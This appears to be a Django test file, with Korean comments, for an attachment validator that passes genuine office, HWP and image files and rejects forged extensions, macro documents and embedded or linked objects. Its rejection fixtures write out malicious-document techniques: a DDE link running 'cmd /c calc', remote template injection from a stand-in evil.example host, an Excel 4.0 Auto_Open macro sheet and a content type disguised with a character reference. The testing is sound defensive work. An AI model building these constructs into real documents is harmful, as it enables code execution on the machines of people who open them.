"""P4 첨부 형식 넓히기: 형식마다 진짜 표본 통과, 확장자만 바꾼 가짜·매크로 문서·허용 안 하는 형식 거부. 공지·일정 둘 다."""
import io
import struct
import zipfile
from functools import lru_cache

from django.core.cache import caches
from hwpx.hwp5.cfb import build_compound_file

from hwpfiles.tests import sample_hwp, sample_hwpx
from today.models import EventFile
from today.test_event_more import MoreBase

from .filekinds import TYPES
from .models import Notice, NoticeFile
from .tests import PDF, Base, up

CT = "application/vnd.openxmlformats-officedocument.{}.main+xml"
MAIN = {"xlsx": ("xl/workbook.xml", CT.format("spreadsheetml.sheet")),
        "docx": ("word/document.xml", CT.format("wordprocessingml.document")),
        "pptx": ("ppt/presentation.xml", CT.format("presentationml.presentation"))}
MACRO_CT = {"xlsm": ("xl/workbook.xml", "application/vnd.ms-excel.sheet.macroEnabled.main+xml"),
            "docm": ("word/document.xml", "application/vnd.ms-word.document.macroEnabled.main+xml"),
            "pptm": ("ppt/presentation.xml", "application/vnd.ms-powerpoint.presentation.macroEnabled.main+xml")}


def zipped(entries):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, body in entries:
            z.writestr(name, body, zipfile.ZIP_STORED if name == "mimetype" else zipfile.ZIP_DEFLATED)
    return buf.getvalue()


def ooxml(part, ctype, extra=(), more_types=""):
    types = ('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
             '<Default Extension="xml" ContentType="application/xml"/>'
             f'<Override PartName="/{part}" ContentType="{ctype}"/>{more_types}</Types>')
    return zipped([("[Content_Types].xml", types), ("_rels/.rels", "<Relationships/>"), (part, "<x/>"), *extra])


def rels(*rows):
    """(Type 끝 이름, Target, TargetMode) → .rels 본문."""
    body = "".join(f'<Relationship Id="r{i}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/{t}"'
                   f' Target="{target}" TargetMode="{mode}"/>' for i, (t, target, mode) in enumerate(rows))
    return f'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">{body}</Relationships>'


def biff(*sheet_types, auto_open=False):
    """xls Workbook 스트림 최소 BIFF8: BOF, 시트마다 BOUNDSHEET(종류 0 일반·1 매크로 시트·6 VBA 모듈), [Auto_Open 이름], EOF."""
    rec = lambda t, body: struct.pack("<HH", t, len(body)) + body  # noqa: E731
    out = rec(0x0809, struct.pack("<HHHHII", 0x0600, 0x0005, 0, 0, 0, 0))
    for i, dt in enumerate(sheet_types):
        out += rec(0x0085, struct.pack("<IBBBB", 0, 0, dt, 1, 0) + bytes([65 + i]))
    if auto_open:  # 내장 이름 1(Auto_Open)이 매크로 시트를 가리킨다
        out += rec(0x0018, struct.pack("<HBBHHHBBBB", 0x0020, 0, 1, 0, 0, 0, 0, 0, 0, 0) + b"\x01")
    return out + rec(0x000A, b"")


def odf(sub, extra=()):
    return zipped([("mimetype", f"application/vnd.oasis.opendocument.{sub}"), ("content.xml", "<x/>"),
                   ("META-INF/manifest.xml", "<m/>"), *extra])


def ole(*streams):
    """스트림 이름(내용은 0) 또는 (이름, 내용)."""
    return build_compound_file([s if isinstance(s, tuple) else (s, b"\0" * 64) for s in streams])


@lru_cache(maxsize=None)
def samples():
    """확장자 → 진짜 최소 표본."""
    return {
        "hwp": sample_hwp(), "hwpx": sample_hwpx(), "pdf": PDF,
        **{k: ooxml(*v) for k, v in MAIN.items()},
        "xls": ole(("Workbook", biff(0, 2)), "\x05SummaryInformation"), "doc": ole("WordDocument", "1Table"),
        "ppt": ole("PowerPoint Document", "Current User"),
        "odt": odf("text"), "ods": odf("spreadsheet"), "odp": odf("presentation"),
        "jpg": b"\xff\xd8\xff\xe0\x00\x10JFIF\x00" + b"\0" * 20, "png": b"\x89PNG\r\n\x1a\n" + b"\0" * 20,
        "gif": b"GIF89a" + b"\0" * 20,
    }


def fakes():
    """(이름, 내용): 확장자만 바꾼 가짜."""
    s = samples()
    return [("양식.xls", s["hwp"]), ("양식.doc", s["hwp"]), ("문서.hwp", s["doc"]), ("표.doc", s["xls"]),
            ("자료.docx", zipped([("a.txt", "x")])), ("표.xlsx", s["docx"]), ("발표.pptx", s["xlsx"]),
            ("문서.docx", s["odt"]), ("문서.odt", s["docx"]), ("표.ods", s["odt"]), ("문서.odt", s["hwpx"]),
            ("문서.hwpx", s["odt"]), ("사진.jpg", s["png"]), ("사진.png", s["gif"]), ("사진.gif", PDF),
            ("문서.pdf", s["jpg"]), ("표.xls", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 600),
            ("문서.odt", zipped([("mimetype", "application/epub+zip")])),
            ("표.xlsx", ooxml("xl/workbook.xml", "application/vnd.openxmlformats-officedocument.spreadsheetml.template.main+xml"))]


def macros():
    out = [(f"매크로.{k[:-1]}x", ooxml(*v)) for k, v in MACRO_CT.items()]  # 이름만 xlsx로 바꾼 xlsm 등
    out += [("매크로.xlsx", ooxml(*MAIN["xlsx"], extra=[("xl/vbaProject.bin", b"\0" * 10)])),
            ("매크로.docx", ooxml(*MAIN["docx"], extra=[("word/vbaProject.bin", b"\0" * 10)])),
            ("매크로.xls", ole(("Workbook", biff(0)), "_VBA_PROJECT_CUR/VBA/dir")),
            ("XLM.xls", ole(("Workbook", biff(0, 1, auto_open=True)))),        # Excel 4.0 매크로 시트 + Auto_Open
            ("XLM5.xls", ole(("Book", biff(1)))),
            *[(f"XLM{i}.xlsx", ooxml(*MAIN["xlsx"], more_types=f'<Override PartName="/xl/x/s1.xml" ContentType="application/vnd.ms-excel.{t}+xml"/>'))
              for i, t in enumerate(("macrosheet", "intlmacrosheet", "dialogsheet"))],
            ("XLM이름.xlsx", ooxml(*MAIN["xlsx"], extra=[("xl/macrosheets/sheet1.xml", "<x/>")])),  # content type 없이 부분만                               # BIFF5 'Book' 스트림
            ("모듈.xls", ole(("Workbook", biff(0, 6)))),                        # VBA 모듈 시트
            # 주석 속 미끼 + 문자 참조로 숨긴 매크로판 주 형식: 바이트 검색이면 xlsx로 보였다
            ("우회.xlsx", ooxml("xl/workbook.xml", "application/vnd.ms-excel.sheet.macro&#69;nabled.main+xml",
                                more_types=f'<!-- ContentType="{MAIN["xlsx"][1]}" -->')),
            ("매크로.doc", ole("WordDocument", "Macros/VBA/_VBA_PROJECT")),
            ("매크로.ppt", ole("PowerPoint Document", "VBA/dir")),
            ("매크로.odt", odf("text", [("Basic/Standard/Module1.xml", "<m/>")])),
            ("매크로.ods", odf("spreadsheet", [("Scripts/python/a.py", "x")]))]
    return out


EXT = "External"
SML = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"


def embeds():
    """외부 대상 연결·포함 OLE 개체."""
    docx = MAIN["docx"]
    return [("개체.docx", ooxml(*docx, extra=[("word/embeddings/oleObject1.bin", b"\0")])),
            ("개체.pptx", ooxml(*MAIN["pptx"], extra=[("ppt/embeddings/oleObject2.bin", b"\0")])),
            ("DDE.xlsx", ooxml(*MAIN["xlsx"], extra=[("xl/externalLinks/externalLink1.xml",
                                                     f'<externalLink xmlns="{SML}"><ddeLink ddeService="cmd" ddeTopic="/c calc"/></externalLink>')])),
            ("OLE연결.xlsx", ooxml(*MAIN["xlsx"], extra=[("xl/externalLinks/externalLink1.xml",
                                                        f'<externalLink xmlns="{SML}"><oleLink progId="Package"/></externalLink>')])),
            ("서식주입.docx", ooxml(*docx, extra=[("word/_rels/settings.xml.rels",
                                                   rels(("attachedTemplate", "http://evil.example/t.dotm", EXT)))])),
            ("서식UNC.docx", ooxml(*docx, extra=[("word/_rels/settings.xml.rels",
                                                  rels(("attachedTemplate", "\\\\host\\t.dotm", EXT)))])),
            ("틀.docx", ooxml(*docx, extra=[("word/_rels/webSettings.xml.rels", rels(("frame", "http://x/", EXT)))])),
            ("연결개체.pptx", ooxml(*MAIN["pptx"], extra=[("ppt/slides/_rels/slide1.xml.rels",
                                                         rels(("oleObject", "file://host/a.xls", EXT)))])),
            ("개체.doc", ole("WordDocument", "ObjectPool/_1/\x01Ole10Native")),
            ("수식.doc", ole("WordDocument", "ObjectPool/_2/Equation Native")),
            ("꾸러미.xls", ole(("Workbook", biff(0)), "MBD0001/\x01Ole10Native")),
            ("개체.ppt", ole("PowerPoint Document", "\x01Ole10Native"))]


BLOCKED = [("묶음.zip", zipped([("a.txt", "x")])), ("글꼴.ttf", b"\x00\x01\x00\x00" + b"\0" * 20),
           ("소리.mp3", b"ID3\x03" + b"\0" * 20), ("그림.ai", PDF), ("메모.txt", b"hello"), ("이름없음", PDF),
           ("실행.exe", b"MZ\x90\x00"), ("그림.bmp", b"BM" + b"\0" * 20), ("그림.svg", b"<svg/>"),
           ("서식.xltx", ooxml("xl/workbook.xml", CT.format("spreadsheetml.template"))),
           *[(f"매크로.{k}", ooxml(*v)) for k, v in MACRO_CT.items()]]  # 매크로판 확장자는 이름에서 거부


class NoticeKinds(Base):
    def rejected(self, name, data):
        caches["ratelimit"].clear()  # 회원당 시간 30회 제한
        before = NoticeFile.objects.count()
        r = self.write(attach=[up(name, data)])
        self.assertEqual(r.status_code, 400, name)
        self.assertEqual((NoticeFile.objects.count(), Notice.objects.count()), (before, 0), name)
        return r.content.decode()

    def test_each_kind_accepted_and_downloaded_as_attachment(self):
        for ext, data in samples().items():
            with self.subTest(ext=ext):
                n = self.made(attach=[up(f"자료.{ext}", data)])
                f = n.files.get()
                self.assertEqual(f.kind, ext)
                r = self.client.get(f"{self.base}/{n.key}/f/{f.key}")
                self.assertEqual(r["Content-Type"], TYPES[ext])
                self.assertTrue(r["Content-Disposition"].startswith("attachment"))
                self.assertEqual(r["X-Content-Type-Options"], "nosniff")
                self.assertIn("sandbox", r["Content-Security-Policy"])
                self.assertEqual(b"".join(r.streaming_content), data)
                n.delete()

    def test_jpeg_name_is_jpg(self):
        n = self.made(attach=[up("사진.JPEG", samples()["jpg"])])
        f = n.files.get()
        self.assertEqual((f.kind, f.name), ("jpg", "사진.JPEG"))
        self.assertTrue(f.file.name.endswith(".jpg"))

    def test_forged_extension_rejected(self):
        for name, data in fakes():
            with self.subTest(name=name):
                self.assertIn("내용이 달라요", self.rejected(name, data))

    def test_macro_documents_rejected(self):
        for name, data in macros():
            with self.subTest(name=name):
                self.assertIn("매크로가 든 문서", self.rejected(name, data))

    def test_external_links_and_embedded_objects_rejected(self):
        for name, data in embeds():
            with self.subTest(name=name):
                self.assertIn("넣은 개체", self.rejected(name, data))

    def test_normal_links_charts_images_pass(self):
        docx = MAIN["docx"]
        ok = [("링크.docx", ooxml(*docx, extra=[("word/_rels/document.xml.rels",
                                               rels(("hyperlink", "https://www.neis.go.kr/", EXT), ("image", "media/image1.png", "Internal")))])),
              ("내서식.docx", ooxml(*docx, extra=[("word/_rels/settings.xml.rels",
                                                rels(("attachedTemplate", "file:///C:/Users/t/Normal.dotm", EXT)))])),
              ("차트.docx", ooxml(*docx, extra=[("word/embeddings/Microsoft_Excel_Worksheet.xlsx", b"PK"),
                                              ("word/media/image1.png", b"\x89PNG")])),
              ("다른표참조.xlsx", ooxml(*MAIN["xlsx"], extra=[
                  ("xl/externalLinks/externalLink1.xml", f'<externalLink xmlns="{SML}"><externalBook r:id="rId1" '
                   'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheetNames><sheetName val="1학기"/>'
                   '</sheetNames></externalBook></externalLink>'),
                  ("xl/externalLinks/_rels/externalLink1.xml.rels", rels(("externalLinkPath", "file:///\\\\server\\성적.xlsx", EXT)))])),
              ("그림.pptx", ooxml(*MAIN["pptx"], extra=[("ppt/media/image1.jpeg", b"\xff\xd8\xff")]))]
        for name, data in ok:
            with self.subTest(name=name):
                caches["ratelimit"].clear()
                n = self.made(attach=[up(name, data)])
                self.assertEqual(n.files.get().kind, name.rsplit(".", 1)[1])
                n.delete()

    def test_broken_rels_rejected(self):
        data = ooxml(*MAIN["docx"], extra=[("word/_rels/document.xml.rels", "<Relationships")])
        self.assertIn("안전하지", self.rejected("깨진관계.docx", data))

    def test_doctype_in_content_types_rejected(self):
        data = zipped([("[Content_Types].xml", '<!DOCTYPE T [<!ENTITY e "x">]><Types><Override ContentType="'
                        f'{MAIN["docx"][1]}"/></Types>'), ("word/document.xml", "<x/>")])
        self.assertIn("내용이 달라요", self.rejected("문서.docx", data))

    def test_blocked_kinds_rejected(self):
        for name, data in BLOCKED:
            with self.subTest(name=name):
                self.rejected(name, data)
        self.assertIn("그림만 올릴 수 있어요", self.rejected("묶음.zip", BLOCKED[0][1]))

    def test_many_entries_zip_rejected_without_unpacking(self):
        entries = [("[Content_Types].xml", f'"{MAIN["docx"][1]}"')] + [(f"f{i}", "") for i in range(1001)]
        self.assertIn("안전하지", self.rejected("많음.docx", zipped(entries)))

    def test_form_lists_new_kinds(self):
        page = self.client.get(f"{self.base}/new").content.decode()
        self.assertIn("한글·PDF·오피스·그림, 5개까지, 개당 20MB", page)
        self.assertIn(".xlsx", page)
        self.assertIn(".jpeg", page)


class EventKinds(MoreBase):
    def setUp(self):
        super().setUp()
        self.e = self.ev(self.t41, "협의", "all")

    def test_each_kind_accepted(self):
        s = samples()
        exts = list(s)
        for i in range(0, len(exts), 5):
            batch = exts[i:i + 5]
            r = self.upload(self.t41, self.e, *[up(f"자료.{x}", s[x]) for x in batch])
            self.assertEqual(r.status_code, 200, batch)
            self.assertEqual(sorted(self.e.files.values_list("kind", flat=True)), sorted(batch))
            for f in self.e.files.all():
                d = self.as_(self.t41).get(self.url(self.e, f"/f/{f.key}"))
                self.assertEqual(d["Content-Type"], TYPES[f.kind])
                self.assertTrue(d["Content-Disposition"].startswith("attachment"))
                self.assertEqual(d["X-Content-Type-Options"], "nosniff")
            self.e.files.all().delete()

    def test_fakes_macros_blocked_rejected(self):
        for name, data in fakes() + macros() + embeds() + BLOCKED:
            with self.subTest(name=name):
                caches["ratelimit"].clear()  # 회원당 시간 30회 제한
                r = self.upload(self.t41, self.e, up(name, data))
                self.assertEqual(r.status_code, 400)
                self.assertEqual(EventFile.objects.count(), 0)

    def test_panel_lists_new_kinds(self):
        page = self.as_(self.t41).get(self.url(self.e, "/more")).content.decode()
        self.assertIn("한글·PDF·오피스·그림, 5개까지, 개당 20MB", page)
        self.assertIn(".pptx", page)
